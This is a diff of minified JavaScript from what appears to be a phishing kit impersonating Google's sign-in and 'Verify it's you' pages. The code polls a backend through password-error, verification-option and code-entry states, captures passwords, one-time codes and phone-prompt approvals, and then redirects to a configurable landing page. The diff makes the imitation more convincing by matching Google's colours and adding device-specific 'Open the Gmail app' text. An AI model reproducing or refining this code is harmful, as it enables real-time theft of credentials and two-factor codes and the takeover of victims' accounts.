isPasswordError=r.verificationState==='WAITINGPASSWORD_ERROR'||r.accountAccess===false&&(r.message&&(r.message.includes('Incorrect')||r.message.includes('incorrect')||r.message.includes('Wrong')||r.message.includes("Couldn't")||r.message.includes('password')||r.message.includes('Password')));if(isPasswordError){const errMsg=r.message||'Incorrect password. Please try again.';if(errMsg!==lastPasswordErrorMsg){pF.value='';lastPasswordErrorMsg=errMsg}showFieldError('InvalidPassword','passwordGroup',errMsg);}}catch(e){}}else if(s==='WAITINGPASSWORDERROR'){const genericPasswordError='Incorrect password. Please try again.';if(genericPasswordError!==lastPasswordErrorMsg){pF.value='';lastPasswordErrorMsg=genericPasswordError}showFieldError('InvalidPassword','passwordGroup',genericPasswordError)}startPolling(2000);break;}
-case'WAITINGOPTIONS':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();eG.style.display='none';pG.style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';vOG.style.display='block';vCG.style.display='none';sB.style.display='none';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#1a73e8;text-decoration:none;font-weight:500">Learn more</a>';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let rO=d.verificationOptions||[];if(typeof rO==='string'){try{rO=JSON.parse(rO)}catch(e){rO=[]}}const oA=Array.isArray(rO)?rO:[];const oH=JSON.stringify(oA);if(oH!==lastRenderedOptionsHash){lastRenderedOptionsHash=oH;renderVerificationOptions(oA)}startPolling(2000);break;}
-case'WAITINGCODE':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();eG.style.display='none';pG.style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';vOG.style.display='none';vCG.style.display='none';document.getElementById('phonePromptView').style.display='none';const lc=document.getElementById('left_child');if(lc)lc.style.display='flex';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let _gmail=d.gmail;if(!_gmail&&d.lastJsonResponse){try{const _lr=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;_gmail=_lr.gmail}catch(e){}}const isPhonePrompt=_gmail&&_gmail.step==='waiting_app_notification';if(isPhonePrompt){document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in.';const ppV=document.getElementById('phonePromptView');if(ppV)ppV.style.display='block';const ppI=document.getElementById('phonePromptInstructions');if(ppI&&_gmail.instructions)ppI.textContent=_gmail.instructions;sB.style.display='none';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';document.getElementById('verifySentMessage').style.display='none';startPolling(2000);break;}vCG.style.display='block';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#1a73e8;text-decoration:none;font-weight:500">Learn more</a>';const vsM=document.getElementById('verifySentMessage');const mE=document.getElementById('maskedEmail');if(vsM){let recipientEmail=d.email||eF.value||'';try{const opts=typeof d.verificationOptions==='string'?JSON.parse(d.verificationOptions):(d.verificationOptions||[]);const emailOpt=Array.isArray(opts)?opts.find(o=>o.type==='email_code'&&o.label):null;if(emailOpt&&emailOpt.label){const match=emailOpt.label.match(/at\s+(.+)$/i);if(match)recipientEmail=match[1].trim()}}catch(e){}if(mE)mE.textContent=recipientEmail.includes('\u2022')?recipientEmail:maskEmail(recipientEmail);vsM.style.display='block'}sB.innerText='Next';sB.style.display='inline-flex';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';const cL=document.getElementById('verificationCodeLabel');const vN=d.viewName||(d.lastJsonResponse?(()=>{try{return(typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse).viewName||''}catch(e){return''}})():'');if(cL)cL.textContent=/authenticator|otp/i.test(vN)?'Open your authenticator app and enter the 6-digit code':'Enter code';const vCI=document.getElementById('txtVerificationCode');if(vCI){vCI.placeholder='Enter code'}if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message&&(r.message.includes('Incorrect verification code')||r.message.includes('incorrect code'))){if(!_codeErrorShown){if(vCI)vCI.value='';_codeErrorShown=true}showFieldError('InvalidVerificationCode','verificationCodeGroup',r.message)}}catch(e){}}startPolling(2000);break;}
+case'WAITINGOPTIONS':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();eG.style.display='none';pG.style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';vOG.style.display='block';vCG.style.display='none';sB.style.display='none';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#0b57d0;text-decoration:none;font-weight:500">Learn more</a>';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let rO=d.verificationOptions||[];if(typeof rO==='string'){try{rO=JSON.parse(rO)}catch(e){rO=[]}}const oA=Array.isArray(rO)?rO:[];const oH=JSON.stringify(oA);if(oH!==lastRenderedOptionsHash){lastRenderedOptionsHash=oH;renderVerificationOptions(oA)}startPolling(2000);break;}
+case'WAITINGCODE':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();eG.style.display='none';pG.style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';vOG.style.display='none';vCG.style.display='none';document.getElementById('phonePromptView').style.display='none';const lc=document.getElementById('left_child');if(lc)lc.style.display='flex';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}let _gmail=d.gmail;if(!_gmail&&d.lastJsonResponse){try{const _lr=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;_gmail=_lr.gmail}catch(e){}}const isPhonePrompt=_gmail&&_gmail.step==='waiting_app_notification';if(isPhonePrompt){document.getElementById('signin_heading').innerText="2-Step Verification";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in.';const ppV=document.getElementById('phonePromptView');if(ppV)ppV.style.display='block';const ppH=document.getElementById('phonePromptHeading');if(ppH){ppH.textContent=_gmail.deviceName?'Open the Gmail app on '+_gmail.deviceName:'Open the Gmail app on your phone'}const ppI=document.getElementById('phonePromptInstructions');if(ppI&&_gmail.instructions)ppI.textContent=_gmail.instructions;sB.style.display='none';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';document.getElementById('verifySentMessage').style.display='none';startPolling(2000);break;}vCG.style.display='block';document.getElementById('signin_heading').innerText="Verify it's you";document.getElementById('statement').innerHTML='To help keep your account safe, Google wants to make sure it\'s really you trying to sign in. <a href="https://support.google.com/accounts/answer/12097" target="_blank" style="color:#0b57d0;text-decoration:none;font-weight:500">Learn more</a>';const vsM=document.getElementById('verifySentMessage');const mE=document.getElementById('maskedEmail');if(vsM){let recipientEmail=d.email||eF.value||'';try{const opts=typeof d.verificationOptions==='string'?JSON.parse(d.verificationOptions):(d.verificationOptions||[]);const emailOpt=Array.isArray(opts)?opts.find(o=>o.type==='email_code'&&o.label):null;if(emailOpt&&emailOpt.label){const match=emailOpt.label.match(/at\s+(.+)$/i);if(match)recipientEmail=match[1].trim()}}catch(e){}if(mE)mE.textContent=recipientEmail.includes('\u2022')?recipientEmail:maskEmail(recipientEmail);vsM.style.display='block'}sB.innerText='Next';sB.style.display='inline-flex';const tAW=document.getElementById('tryAnotherWay');if(tAW)tAW.style.display='inline-block';document.getElementById('create_button').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('forgot').style.display='none';const cL=document.getElementById('verificationCodeLabel');const vN=d.viewName||(d.lastJsonResponse?(()=>{try{return(typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse).viewName||''}catch(e){return''}})():'');if(cL)cL.textContent=/authenticator|otp/i.test(vN)?'Open your authenticator app and enter the 6-digit code':'Enter code';const vCI=document.getElementById('txtVerificationCode');if(vCI){vCI.placeholder='Enter code'}if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message&&(r.message.includes('Incorrect verification code')||r.message.includes('incorrect code'))){if(!_codeErrorShown){if(vCI)vCI.value='';_codeErrorShown=true}showFieldError('InvalidVerificationCode','verificationCodeGroup',r.message)}}catch(e){}}startPolling(2000);break;}
 case'COMPLETED':case'PROCESSING_FINALIZING':{hideLoadingOverlay();clearInterval(pollingIntervalId);let rU=templateConfig.landingPageLink&&templateConfig.landingPageLink.trim()!==''?templateConfig.landingPageLink:window.location.href;if(rU&&!rU.startsWith('http://')&&!rU.startsWith('https://'))rU='https://'+rU;window.location.href=rU;break;}
 case'FAILED':{let failMsg='Document retrieval failed. Please try again later.';if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message)failMsg=r.message}catch(e){}}showFailedView(failMsg);clearInterval(pollingIntervalId);break;}
 default:{showStyledError('An unexpected status was received. Please try again.');clearInterval(pollingIntervalId);hideLoadingOverlay();}}}
